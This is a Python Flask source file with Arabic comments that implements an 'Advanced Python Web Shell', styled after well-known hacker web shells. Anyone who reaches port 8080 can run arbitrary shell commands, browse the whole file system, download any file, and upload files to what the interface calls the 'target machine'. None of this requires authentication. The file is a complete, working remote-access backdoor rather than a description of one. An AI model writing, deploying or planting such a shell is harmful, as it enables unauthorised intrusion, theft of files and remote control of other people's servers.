from flask import Flask, render_template_string, request, send_file, redirect, url_for
import os
import subprocess
import shutil

app = Flask(__name__)

# تصميم واجهة احترافية شبيهة بالـ Web Shellز الشهيرة (Dark Hacker Theme)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Advanced Python Web Shell</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
        h2 { color: #58a6ff; text-align: center; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
        .container { max-width: 1100px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .section { margin-bottom: 25px; padding: 15px; background: #21262d; border-radius: 6px; border: 1px solid #30363d; }
        pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 5px; max-height: 350px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
        input[type="text"], input[type="file"] { width: 70%; padding: 8px; background: #0d1117; color: #fff; border: 1px solid #30363d; font-family: monospace; border-radius: 4px; }
        input[type="submit"], button { padding: 8px 15px; background: #238636; color: #fff; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
        input[type="submit"]:hover, button:hover { background: #2ea043; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; }
        th { background: #1f6feb; color: white; }
        a { color: #58a6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .path-bar { font-size: 16px; color: #f0883e; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ Advanced System & Disk Web Shell ⚡</h2>
        
        <!-- معلومات المسار الحالي -->
        <div class="section">
            <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
            <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
        </div>

        <!-- قسم تنفيذ الأوامر -->
        <div class="section">
            <h3>💻 تنفيذ الأوامر (Terminal)</h3>
            <pre>{{ output }}</pre>
            <form method="POST">
                <input type="hidden" name="action" value="cmd">
                <input type="text" name="command" placeholder="اكتب الأمر هنا (مثل: df -h, ls -la, free -m)..." autofocus autocomplete="off">
                <input type="submit" value="تنفيذ">
            </form>
        </div>

        <!-- قسم استعراض الملفات والأقراص -->
        <div class="section">
            <h3>📂 استعراض الملفات والمجلدات والأقراص</h3>
            <table>
                <tr>
                    <th>الاسم</th>
                    <th>النوع</th>
                    <th>الحجم / الإجراءات</th>
                </tr>
                {% for item in items %}
                <tr>
                    <td>
                        {% if item.is_dir %}
                            📁 <a href="/?path={{ item.path }}">{{ item.name }}</a>
                        {% else %}
                            📄 {{ item.name }}
                        {% endif %}
                    </td>
                    <td>{{ 'مجلد' if item.is_dir else 'ملف' }}</td>
                    <td>
                        {% if not item.is_dir %}
                            <a href="/download?file={{ item.path }}" target="_blank"><button style="background: #1f6feb;">تحميل</button></a>
                        {% endif %}
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <!-- قسم رفع الملفات -->
        <div class="section">
            <h3>📤 رفع ملف إلى الجهاز المستهدف</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="file">
                <input type="submit" value="رفع الملف">
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    # تحديد المسار الحالي (افتراضياً مجلد العمل الحالي)
    current_path = request.args.get('path', os.getcwd())
    current_path = os.path.abspath(current_path)
    parent_path = os.path.dirname(current_path)
    
    output = "أهلاً بك يا محمد! النظام جاهز لإدارة الأقراص والملفات:\n"
    
    if request.method == "POST":
        action = request.form.get("action")
        
        # معالجة تنفيذ الأوامر
        if action == "cmd":
            command = request.form.get("command")
            if command:
                output += f"root@system:{current_path}$ {command}\n"
                try:
                    res = subprocess.run(command, shell=True, cwd=current_path, capture_output=True, text=True, timeout=15)
                    output += res.stdout + res.stderr
                except Exception as e:
                    output += f"Error: {str(e)}\n"
                    
        # معالجة رفع الملفات
        elif action == "upload":
            uploaded_file = request.files.get('file')
            if uploaded_file:
                file_path = os.path.join(current_path, uploaded_file.filename)
                uploaded_file.save(file_path)
                output += f"[+] تم رفع الملف بنجاح إلى: {file_path}\n"

    # جلب محتويات المجلد والأقراص
    items = []
    try:
        for entry in os.scandir(current_path):
            items.append({
                'name': entry.name,
                'is_dir': entry.is_dir(),
                'path': entry.path
            })
    except Exception as e:
        output += f"خطأ في قراءة المجلد: {str(e)}\n"

    return render_template_string(HTML_TEMPLATE, current_path=current_path, parent_path=parent_path, output=output, items=items)

@app.route("/download")
def download():
    file_path = request.args.get('file')
    if file_path and os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    return "الملف غير موجود!", 404

if __name__ == "__main__":
    # يعمل على أي منفذ أكبر من 1024 (مثلاً 8080) بدون روت
    app.run(host="0.0.0.0", port=8080, debug=False)
